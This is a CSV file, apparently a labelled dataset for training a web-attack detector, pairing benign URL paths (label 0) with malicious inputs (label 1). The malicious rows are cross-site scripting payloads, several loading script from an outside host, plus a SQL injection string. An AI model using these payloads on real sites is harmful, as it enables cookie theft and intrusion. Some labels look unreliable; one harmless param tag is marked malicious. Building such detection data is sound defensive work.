payload,label
/login.html?token=hải79,0
/assets/style.css?category=shoes457,0
/api/v1/users?q=admin445,0
/product/detail?page=shoes322,0
/api/v1/users?category=contact941,0
/product/detail?user=shoes569,0
/index.php?category=contact216,0
/product/detail?token=2026974,0
">""<FRAMESET><FRAME SRC=""javascript:document.cookie=true;""></FRAMESET>",1
/api/v1/users?id=2026520,0
/assets/style.css?user=apple227,0
/login.html?token=hải979,0
<a onmouseover=location=’javascript:alert(1)>click,1
/login.html?user=2026560,0
/product/detail?category=shoes197,0
"<LAYER SRC=""http://vulnerability-lab.com/script.html""></LAYER>",1
/product/detail?page=hải274,0
/index.php?q=123416,0
/login.html?id=kma402,0
"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",1
/search?user=hải569,0
/login.html?token=shoes467,0
/index.php?id=hải974,0
/assets/style.css?user=book222,0
/home?page=apple136,0
/search?category=contact669,0
/assets/style.css?user=contact415,0
/assets/style.css?page=shoes11,0
/assets/style.css?page=shoes860,0
/api/v1/users?token=profile648,0
/home?token=apple965,0
/home?page=contact854,0
/login.html?token=123100,0
/assets/style.css?user=contact783,0
/assets/style.css?token=profile591,0
</b><script>alert(7)</script>,1
"'';!--""<XSS>=&{()}",1
/home?token=apple926,0
/search?token=admin185,0
/api/v1/users?user=hải538,0
/home?page=hải112,0
"<param name=""menu"" value=""false"" />",1
/home?category=profile112,0
/search?token=contact5,0
/product/detail?user=apple296,0
/product/detail?page=apple45,0
/assets/style.css?q=hải544,0
"<link href=""javascript:alert(1)"" rel=""next"">",1
/search?id=shoes749,0
/search?category=202687,0
/product/detail?user=admin752,0
/api/v1/users?id=profile46,0
/index.php?token=shoes620,0
/home?token=123730,0
/search?token=apple924,0
"perl -e 'print ""<IMG SRC=java\0script:alert(\""XSS\"")>"";' > out",1
/api/v1/users?category=shoes99,0
/search?category=kma369,0
/search?category=123653,0
/login.html?q=book78,0
/assets/style.css?q=apple640,0
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('CrossSiteScripting');"">",1
/search?page=admin42,0
/assets/style.css?page=apple98,0
/search?q=apple425,0
/search?token=202627,0
/search?category=contact806,0
'OR%0b1=1--,1
/index.php?id=admin351,0
/search?category=apple203,0
/home?id=123998,0
/home?category=2026856,0
/login.html?q=kma670,0
/api/v1/users?id=hải6,0
/home?page=profile385,0
/home?q=profile136,0
/api/v1/users?id=admin297,0
/product/detail?q=admin232,0
/api/v1/users?token=2026806,0
/assets/style.css?q=contact283,0
/login.html?category=book769,0
/index.php?user=hải99,0
/api/v1/users?id=admin108,0
<img src ?itworksonchrome?\/onerror = alert(1),1
/search?id=2026178,0
<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>,1
/index.php?category=2026713,0
/api/v1/users?token=hải804,0
/index.php?token=profile428,0
/assets/style.css?token=contact910,0
/login.html?token=kma921,0
/assets/style.css?user=book474,0
/login.html?category=123129,0
/index.php?page=contact553,0
/index.php?page=apple952,0
/api/v1/users?category=123218,0
"document.write(""\u003Cscript src=http://ha.ckers.org/xss.js\u003E\u003C/script\u003E"");",1
""";location=location.hash)//#0={};alert(0)",1
/assets/style.css?page=admin226,0
<script>confirm (/xss by evan/);</script>,1
/assets/style.css?page=shoes364,0
"<A HREF=""//google"">XSS</A>",1
